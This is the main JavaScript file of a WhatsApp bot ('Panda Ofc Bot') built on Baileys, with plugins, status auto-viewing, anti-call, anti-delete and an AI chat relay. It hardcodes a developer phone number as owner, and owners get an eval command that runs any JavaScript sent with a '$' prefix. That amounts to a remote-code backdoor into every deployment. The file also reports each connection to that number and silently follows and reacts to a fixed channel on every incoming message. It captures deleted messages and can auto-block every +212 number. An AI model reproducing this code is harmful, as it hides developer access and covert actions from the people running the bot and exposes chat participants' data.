
const EventEmitter = require('events');
EventEmitter.defaultMaxListeners = Infinity;
const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const { GoogleGenerativeAI } = require("@google/generative-ai");
const P = require('pino')
const FileType = require('file-type')
const l = console.log
var config = require('./settings')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
var prefix = config.PREFIX
const getWelcome = () => config.WELCOME_GOODBYE;
var prefixRegex = config.prefix === "false" || config.prefix === "null" ? "^" : new RegExp('^[' + config.PREFIX + ']');

const cheerio = require('cheerio');

const moment = require('moment-timezone')


const path = require('path')
const msgRetryCounterCache = new NodeCache()

    const axios = require('axios')
    const { File } = require('megajs')
    



const sess = config.SESSION_ID
const sessionID = sess.split('~')[1]




const ownerNumber =  ['94775341543']
//===================SESSION============================
  const SESSION_DIR = `./session`;
    if (!fs.existsSync(SESSION_DIR)) {
        fs.mkdirSync(SESSION_DIR);
      }
if (!fs.existsSync(__dirname + `/session/creds.json`)) {
    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
      const sessdata = sessionID
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + `/session/creds.json`, data, () => {
          console.log("Session download completed !!")
        })
      })
    
  }
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
//====================================



async function connectToWA() {
//Run the function
  
	console.log("Connecting Bot 🧬...");
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/session/`)
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

    conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('Installing plugins 🔌... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed ✅')
            console.log('Bot connected ✅')
            
const up = ` 𝐏ᴀɴᴅᴀ   𝐎ꜰᴄ   𝐁ᴏᴛ™ connected successful`;

        await conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
            image: { url: config.ALIVE_IMG },
            caption: up
        });

        const upd = `*𝐏ᴀɴᴅᴀ   𝐎ꜰᴄ   𝐁ᴏᴛ™*`;
        await conn.sendMessage("94775341543@s.whatsapp.net", {
            text: upd
        });
    }
});
    //============================================================================

const {smsg, getBuffer, getGroupAdmins,getRandom,h2k,isUrl,  Json, runtime,sleep,fetchJson,fetchBuffer,getFile,openai} = require('./lib/functions')
const { sms,downloadMediaMessage} = require('./lib/msg')
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
var { get_set , input_set } = require('./lib/set_db')        









conn.ev.on('creds.update', saveCreds)  

    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
	    var id_db = require('./lib/id_db')    
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
             //----------------AUTO STATUS VIEW-------------------------------

if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '😍'}}, { statusJidList: [mek.key.participant, mnyako] })
}	      
	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            const m = sms(conn, mek)
	    var smg = m
            const type = getContentType(mek.message)
            const content = JSON.stringify(mek.message)
            const from = mek.key.remoteJid
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []


const metadata = await conn.newsletterMetadata("jid", "120363296605464049@newsletter")	      
if (metadata.viewer_metadata === null){
await conn.newsletterFollow("120363296605464049@newsletter")
console.log("CHANNEL FOLLOW ✅")
}	 


const id = mek.key.server_id
await conn.newsletterReactMessage("120363296605464049@newsletter", id, "❤️")

//==================================Button================================
	      
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :(type == 'interactiveResponseMessage' ) ? mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :(type == 'templateButtonReplyMessage' )? mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  


 
 //==================================================================




 
	    var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)    
	    prefix = config.PREFIX
var isCmd = body.startsWith(prefix)	    
var command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
var args = body.trim().split(/ +/).slice(1)
var q = args.join(' ')

    var body2 = ''
 if(smg.quoted && smg.quoted.fromMe && await id_db.check(smg.quoted.id)  ){
if (body.startsWith(prefix))  body = body.replace( prefix , '')
			     
			     
var id_body = await id_db.get_data( smg.quoted.id , body)
	
if (id_body.cmd) {
  isCmd = true
command = id_body.cmd.startsWith(prefix)?  id_body.cmd.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
args = id_body.cmd.trim().split(/ +/).slice(1)
q = args.join(' ')		
}
}
      console.log(command)
	      
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Didula MD'
	    const ownbot = config.OWNER
	    const isownbot = ownbot?.includes(senderNumber)
	    const newNumber = '94775341543'
            const sudo = config.SUDO
            const developers = `${newNumber},${sudo}`;
            const isbot = botNumber.includes(senderNumber)
	    const isdev = developers.includes(senderNumber) 	
            let epaneda =  "94775341543"
            const epada = epaneda.split(",")	    
            const isDev = [ ...epada ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)
	    const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)	  
	    const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isReact =m.message.reactionMessage ? true : false
	    const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}






//==================================Nonbutton================================



function jsonConcat(o1, o2) {
 for (var key in o2) {
  o1[key] = o2[key];
 }
 return o1;
}	

        
var dbset = await  get_set('all')
config = await jsonConcat(config , dbset)  

const NON_BUTTON = true // Implement a switch to on/off this feature...


conn.replyList = async (from , list_reply , options) => {
function convertNumberList(sections) {
    let result = "";

    sections.forEach((section, sectionIndex) => {
        result += section.title? `${section.title}\n` : ''

        section.rows.forEach((row, rowIndex) => {
            result += `${row.title} │❯❯◦ ${row.description}`;
            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
        });

        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
    });

    return result;
}
if (!list_reply.sections) return false
list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
var t = { ...list_reply }
delete list_reply.sections
delete list_reply.footer
delete list_reply.buttonText
delete list_reply.title
const sentMessage = await conn.sendMessage(from, list_reply , options);	
const cmdArray = [];
t.sections.forEach((section) => {
    section.rows.forEach((row) => {
        cmdArray.push({ rowId: row.rowId, title: row.title });
    });
});
for ( let i = 0; i < cmdArray.length; i++) {	
await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
}}  
      



conn.ev.on("call", async (json) => {
    if (config.ANTI_CALL === true) {
      for (const id of json) {
        if (id.status == "offer") {
          if (id.isGroup == false) {
            await conn.sendMessage(id.from, {
              text: `😪 user is busy now`,
              mentions: [id.from],
            });
            await conn.rejectCall(id.id, id.from);
          } else {
            await conn.rejectCall(id.id, id.from);
          }
        }
      }
    }
  });
	      
    
//============================for rvo================================================
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }




////////////////owner react/////////////////////////


	       if(senderNumber.includes("94775341543")){
            if(isReact) return
            m.react("👨🏻‍💻")
        }   
  
  
  
  
  
//read commands
if (isCmd && config.READ_CMD === "true" && config.ALLWAYS_OFFLINE === "false") {
await conn.readMessages([mek.key])  // Mark command as read
}


//================================WORK TYPE============================================ 
if(!isOwner && config.MODE === "private") return 
if(!isOwner && isGroup && config.MODE === "inbox") return 
if(!isOwner && !isGroup && config.MODE === "groups") return 


            //==================================plugin map================================
                  const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply ,config, isCreator , isDev, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config ,isCreator , isDev, botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  }
});




////////// 𝐏ᴀɴᴅᴀ   𝐎ꜰᴄ   𝐁ᴏᴛ™
////////// https://i.ibb.co/Qv6pWXW9/2530.jpg
      


	

//==================================================================

    //============================================================================ 
        

if(body === "send" || body === "ඕනේ" || body === "Seve" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}

  //======================================================================
       if (config.ALLWAYS_OFFLINE === "true") {
        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
    }

    if (senderNumber.startsWith('212') && config.BAD_NO_BLOCK === "true") {
        console.log(`Blocking number +212${senderNumber.slice(3)}...`);

        // Action: Either block the user or remove them from a group
        if (from.endsWith('@g.us')) {
            // If in a group, remove the user
            await conn.groupParticipantsUpdate(from, [sender], 'remove');
            await conn.sendMessage(from, { text: 'User with +212 number detected and removed from the group.' });
        } else {
            // If in a private chat, block the user
            await conn.updateBlockStatus(sender, 'block');
            console.log(`Blocked +212${senderNumber.slice(3)} successfully.`);
        }

        return; // Stop further processing of this message
    }


	      

if (config.AI_CHAT == "true") {
    if (m.quoted) {
        let query = m.body ? m.body.toLowerCase() : "";
        try {
            const response = await fetch(`https://www.dark-yasiya-api.site/ai/letmegpt?q=${encodeURIComponent(query)}`);
            const result = await response.json();

            await conn.sendMessage(from, 
            { 
                text: result.result,
                quoted: mek
            })
            
        } catch (error) {
            console.error("AI Chat Error:", error);
            await conn.sendMessage(from, 
            { 
                text: "⚠️ AI Chat system is currently unavailable.", 
                quoted: mek
            });
        }
    }
}
    



//---------<<ANTI DELETE>>------------------

//---------<<ANTI DELETE>>------------------
//======================================================================================
// Configure max listeners


// Directory to store messages
const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
    fs.mkdirSync(baseDir);
}

// Utility functions for file operations
function loadChatData(remoteJid, messageId) {
    const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
    try {
        const data = fs.readFileSync(chatFilePath, 'utf8');
        return JSON.parse(data) || [];
    } catch (error) {
        return [];
    }
}

function saveChatData(remoteJid, messageId, chatData) {
    const chatDir = path.join(baseDir, remoteJid);

    if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
    }

    const chatFilePath = path.join(chatDir, `${messageId}.json`);

    try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
    } catch (error) {
        console.error('Error saving chat data:', error);
    }
}

// Clear the store every 5 minutes
setInterval(() => {
    const files = fs.readdirSync(baseDir);
    files.forEach(file => {
        const filePath = path.join(baseDir, file);
        if (fs.lstatSync(filePath).isDirectory()) {
            fs.rmSync(filePath, { recursive: true, force: true });
        }
    });
}, 300000); // Clear every 5 minutes

// Handle incoming message
const handleIncomingMessage = (message) => {
    const remoteJid = message.key.remoteJid;
    let messageId = message.key.id;

    // Load the chat data for the specific messageId and remoteJid
    const chatData = loadChatData(remoteJid, messageId);

    // Check if the messageId already exists in the chatData
    const isDuplicate = chatData.some(msg => msg.key.id === messageId);

    if (isDuplicate) {
        console.log(`Duplicate message detected for ID: ${messageId}. Replacing the message.`);

        // Generate a new message ID if it's a duplicate
        const newMessageId = `${messageId}-${new Date().toLocaleTimeString()}`;
        messageId = newMessageId;

        // Save the message with the new ID
        saveChatData(remoteJid, newMessageId, [message]);

        // Handle saving media files (if applicable)
        saveMediaFiles(message, newMessageId, remoteJid);

        return; // Exit after handling the duplicate
    }

    // If not a duplicate, push the new message
    chatData.push(message);

    // Save the updated chat data
    saveChatData(remoteJid, messageId, chatData);

    // Handle saving media files (if applicable)
    saveMediaFiles(message, messageId, remoteJid);
};

// Utility function to save media files (image, audio, video, sticker, voice)
function saveMediaFiles(message, messageId, remoteJid) {
    const mediaDir = path.join(baseDir, remoteJid, 'media');
    if (!fs.existsSync(mediaDir)) {
        fs.mkdirSync(mediaDir, { recursive: true });
    }

    // Check for different media types and decrypt accordingly
    if (message.message?.imageMessage) {
        const mediaPath = path.join(mediaDir, `${messageId}.jpg`);
        conn.downloadAndSaveMediaMessage(message, 'image') // Specify media type explicitly
            .then((mediaBuffer) => {
                console.log('Image successfully downloaded and saved.');
                fs.writeFileSync(mediaPath, mediaBuffer);
            })
            .catch((error) => {
                console.error('Error saving image:', error);
            });
    } else if (message.message?.audioMessage) {
        const mediaPath = path.join(mediaDir, `${messageId}.mp3`);
        conn.downloadAndSaveMediaMessage(message, 'audio') // Specify media type explicitly
            .then((mediaBuffer) => {
                console.log('Audio successfully downloaded and saved.');
                fs.writeFileSync(mediaPath, mediaBuffer);
            })
            .catch((error) => {
                console.error('Error saving audio:', error);
            });
    } else if (message.message?.videoMessage) {
        const mediaPath = path.join(mediaDir, `${messageId}.mp4`);
        conn.downloadAndSaveMediaMessage(message, 'video') // Specify media type explicitly
            .then((mediaBuffer) => {
                console.log('Video successfully downloaded and saved.');
                fs.writeFileSync(mediaPath, mediaBuffer);
            })
            .catch((error) => {
                console.error('Error saving video:', error);
            });
    } else if (message.message?.stickerMessage) {  // Handle stickers
        const mediaPath = path.join(mediaDir, `${messageId}.webp`); // Stickers are typically in .webp format
        conn.downloadAndSaveMediaMessage(message, 'sticker') // Specify media type explicitly
            .then((mediaBuffer) => {
                console.log('Sticker successfully downloaded and saved.');
                fs.writeFileSync(mediaPath, mediaBuffer);
            })
            .catch((error) => {
                console.error('Error saving sticker:', error);
            });
    } else if (message.message?.voiceMessage) {
        const mediaPath = path.join(mediaDir, `${messageId}.opus`);
        conn.downloadAndSaveMediaMessage(message, 'voice') // Specify media type explicitly
            .then((mediaBuffer) => {
                console.log('Voice message successfully downloaded and saved.');
                fs.writeFileSync(mediaPath, mediaBuffer);
            })
            .catch((error) => {
                console.error('Error saving voice message:', error);
            });
    }
}


// Anti-delete functionality for revoked messages
const handleMessageRevocation = async (revocationMessage) => {
    const remoteJid = revocationMessage.key.remoteJid;
    const messageId = revocationMessage.msg.key.id;

    // Load the original chat data for the given messageId and remoteJid
    const chatData = loadChatData(remoteJid, messageId);
    const originalMessage = chatData[0];

    if (originalMessage) {
        const deletedBy = revocationMessage.sender.split('@')[0];
        const sentBy = (originalMessage.key.participant ?? revocationMessage.sender).split('@')[0];

        // Ignore messages deleted by or sent by the bot itself
        if (deletedBy.includes(botNumber) || sentBy.includes(botNumber)) return;

        let messageText = '';
        if (originalMessage.message?.conversation) {
            messageText = originalMessage.message.conversation;
        } else if (originalMessage.message?.extendedTextMessage?.text) {
            messageText = originalMessage.message.extendedTextMessage.text;
        }

        const xx = '```';
        const destination = config.DELETEMSGSENDTO ? `${config.DELETEMSGSENDTO}@s.whatsapp.net` : remoteJid;

        // Check if any media files (image, video, document, sticker, etc.) exist and send them
        const mediaDir = path.join(baseDir, remoteJid, 'media');
        const mediaFileTypes = ['.jpg', '.mp4', '.pdf', '.mp3', '.opus', '.webp']; // Added .webp for stickers

        for (let fileType of mediaFileTypes) {
            const mediaFilePath = path.join(mediaDir, `${messageId}${fileType}`);

            if (fs.existsSync(mediaFilePath)) {
                let mediaBuffer;
                let caption = `🚫 *This ${fileType.substring(1).toUpperCase()} was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n${xx}${fileType.substring(1).toUpperCase()} details were captured.${xx}`;

                // Read the corresponding media file based on its type
                mediaBuffer = fs.readFileSync(mediaFilePath);

                // Send appropriate media based on type
                if (fileType === '.jpg') {
                    conn.sendMessage(destination, { image: { url: mediaBuffer }, caption });
                } else if (fileType === '.mp4') {
                    conn.sendMessage(destination, { video: { url: mediaBuffer }, caption });
                } else if (fileType === '.pdf') {
                    conn.sendMessage(destination, { document: { url: mediaBuffer }, caption });
                } else if (fileType === '.mp3' || fileType === '.opus') {
                    conn.sendMessage(destination, { audio: { url: mediaBuffer }, caption });
                } else if (fileType === '.webp') {  // Handle stickers
                    conn.sendMessage(destination, { sticker: { url: mediaBuffer } });
                    return; // Exit after sending the first found sticker
                }

                // Exit after sending the first found media file
                return;
            }
        }

        // If no media was found, send deleted text message
        conn.sendMessage(destination, {
            text: `🚫 *𝐏ᴀɴᴅᴀ   𝐎ꜰᴄ   𝐁ᴏᴛ™  𝙳𝙴𝙻𝙴𝚃𝙴  𝙼𝚂𝙶  𝙳𝙴𝚃𝙴𝙲𝚃𝙴𝙳*🚫 \n\n 👀 *Deleted by:* _${deletedBy}_\n 👀 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}`,
        });

    } else {
        console.log('Original message not found for revocation.');
    }
};


// Hook into message events
if (!isGroup && config.ANTI_DELETE === "true") {
    if (mek.msg?.type === 0) {
        handleMessageRevocation(mek);
    } else {
        handleIncomingMessage(mek);
    }

    
}
//============================================================================
		    
		    

//==================================================================	

            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:				
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}
app.get("/", (req, res) => {
res.send("📟 Didula-Md Working successfully!");
});
app.listen(port, () => console.log(`𝐏ᴀɴᴅᴀ   𝐎ꜰᴄ   𝐁ᴏᴛ™ Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
    
process.on('uncaughtException', function (errr) {
let e = String(errr)
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', errr)
})
